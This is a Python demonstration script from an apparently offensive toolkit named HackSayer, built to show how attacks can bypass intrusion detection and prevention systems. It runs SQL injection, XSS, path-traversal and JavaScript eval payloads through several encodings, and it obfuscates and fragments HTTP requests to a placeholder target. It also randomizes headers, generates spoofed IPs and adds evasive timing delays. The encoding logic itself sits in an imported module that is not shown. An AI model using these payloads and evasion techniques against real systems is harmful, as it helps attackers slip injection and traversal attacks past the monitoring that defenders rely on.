#!/usr/bin/env python3
"""
IDS/IPS Evasion Demo for HackSayer
Advanced encryption and obfuscation techniques to bypass detection systems
"""

import json
import time
from modules.evasion.evasion_techniques import EvasionManager

class IDSEvasionDemo:
    """Demonstration class for IDS/IPS evasion techniques"""
    
    def __init__(self):
        self.evasion = EvasionManager()
        self.results = []
    
    def demonstrate_payload_encryption(self):
        """Demonstrate various payload encryption methods"""
        print("=== Payload Encryption Demo ===")
        
        # Sample payloads that would trigger IDS/IPS
        payloads = [
            "' OR 1=1--",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "union select * from users",
            "javascript:eval(String.fromCharCode(97,108,101,114,116))"
        ]
        
        encryption_methods = ['base64', 'urlencode', 'double_urlencode', 'hex', 'unicode']
        
        for payload in payloads:
            print(f"\nOriginal Payload: {payload}")
            for method in encryption_methods:
                result = self.evasion.encrypt_payload(payload, method)
                self.results.append({
                    'type': 'payload_encryption',
                    'original': payload,
                    'encrypted': result['encrypted'],
                    'method': method,
                    'obfuscation_ratio': len(result['encrypted']) / len(payload)
                })
                print(f"  {method}: {result['encrypted']}")
    
    def demonstrate_request_obfuscation(self):
        """Demonstrate HTTP request obfuscation"""
        print("\n=== Request Obfuscation Demo ===")
        
        test_requests = [
            {
                'method': 'GET',
                'url': 'http://target.com/vulnerable.php?id=1&search=test',
                'headers': {'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html'}
            },
            {
                'method': 'POST',
                'url': 'http://target.com/login.php',
                'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                'data': 'username=admin&password=secret'
            }
        ]
        
        for req in test_requests:
            obfuscated = self.evasion.obfuscate_request(
                req['method'], 
                req['url'], 
                req.get('headers'), 
                req.get('data')
            )
            
            self.results.append({
                'type': 'request_obfuscation',
                'original': req,
                'obfuscated': obfuscated,
                'techniques_applied': obfuscated['techniques']
            })
            
            print(f"\nOriginal: {req['method']} {req['url']}")
            print(f"Obfuscated: {obfuscated['method']} {obfuscated['url']}")
            print(f"Techniques: {', '.join(obfuscated['techniques'])}")
    
    def demonstrate_stealth_communication(self):
        """Demonstrate stealth communication patterns"""
        print("\n=== Stealth Communication Demo ===")
        
        # Create stealth session
        stealth_session = self.evasion.create_stealth_session()
        
        # Demonstrate evasion headers
        evasion_headers = self.evasion.randomize_headers()
        
        self.results.append({
            'type': 'stealth_communication',
            'session_headers': dict(stealth_session.headers),
            'evasion_headers': evasion_headers,
            'random_ip': self.evasion.generate_random_ip()
        })
        
        print("Stealth Headers:")
        for key, value in stealth_session.headers.items():
            print(f"  {key}: {value}")
    
    def demonstrate_timing_evasion(self):
        """Demonstrate timing-based evasion"""
        print("\n=== Timing Evasion Demo ===")
        
        patterns = ['human', 'random', 'burst', 'slow']
        
        for pattern in patterns:
            delays = []
            for i in range(5):
                delay = self.evasion.add_delays()
                delays.append(delay)
                time.sleep(delay / 1000)  # Convert to seconds
            
            self.results.append({
                'type': 'timing_evasion',
                'pattern': pattern,
                'delays': delays,
                'average_delay': sum(delays) / len(delays)
            })
            
            print(f"{pattern} pattern: {delays}ms (avg: {sum(delays)/len(delays):.2f}ms)")
    
    def demonstrate_fragmentation(self):
        """Demonstrate request fragmentation"""
        print("\n=== Request Fragmentation Demo ===")
        
        test_urls = [
            "http://target.com/api/v1/users/profile/settings",
            "http://target.com/admin/dashboard/config"
        ]
        
        for url in test_urls:
            fragments = self.evasion.fragment_requests(url)
            
            self.results.append({
                'type': 'request_fragmentation',
                'original_url': url,
                'fragments': fragments['fragments'],
                'fragment_count': fragments['fragment_count']
            })
            
            print(f"\nOriginal: {url}")
            print(f"Fragments: {fragments['fragments']}")
            print(f"Count: {fragments['fragment_count']}")
    
    def generate_comprehensive_report(self):
        """Generate comprehensive IDS evasion report"""
        report = {
            'summary': {
                'total_techniques': len(self.results),
                'encryption_methods': len([r for r in self.results if r['type'] == 'payload_encryption']),
                'obfuscation_cases': len([r for r in self.results if r['type'] == 'request_obfuscation']),
                'stealth_sessions': len([r for r in self.results if r['type'] == 'stealth_communication']),
                'timing_patterns': len([r for r in self.results if r['type'] == 'timing_evasion']),
                'fragmentation_cases': len([r for r in self.results if r['type'] == 'request_fragmentation'])
            },
            'techniques': {
                'payload_encryption': [
                    'base64', 'urlencode', 'double_urlencode', 'hex', 'unicode'
                ],
                'request_obfuscation': [
                    'header_randomization', 'parameter_obfuscation', 'method_case_variation'
                ],
                'stealth_features': [
                    'user_agent_rotation', 'header_randomization', 'ip_spoofing',
                    'timing_delays', 'request_fragmentation', 'proxy_support'
                ]
            },
            'detailed_results': self.results
        }
        
        with open('ids_evasion_report.json', 'w') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        return report

def main():
    """Main demonstration function"""
    demo = IDSEvasionDemo()
    
    print("🛡️  HackSayer IDS/IPS Evasion Demo")
    print("=" * 50)
    
    demo.demonstrate_payload_encryption()
    demo.demonstrate_request_obfuscation()
    demo.demonstrate_stealth_communication()
    demo.demonstrate_timing_evasion()
    demo.demonstrate_fragmentation()
    
    report = demo.generate_comprehensive_report()
    
    print("\n" + "=" * 50)
    print("📊 Summary Report:")
    print(f"Total techniques demonstrated: {report['summary']['total_techniques']}")
    print(f"Encryption methods: {report['summary']['encryption_methods']}")
    print(f"Obfuscation cases: {report['summary']['obfuscation_cases']}")
    print(f"Stealth sessions: {report['summary']['stealth_sessions']}")
    print(f"Timing patterns: {report['summary']['timing_patterns']}")
    print(f"Fragmentation cases: {report['summary']['fragmentation_cases']}")
    print(f"\nFull report saved to: ids_evasion_report.json")

if __name__ == "__main__":
    main()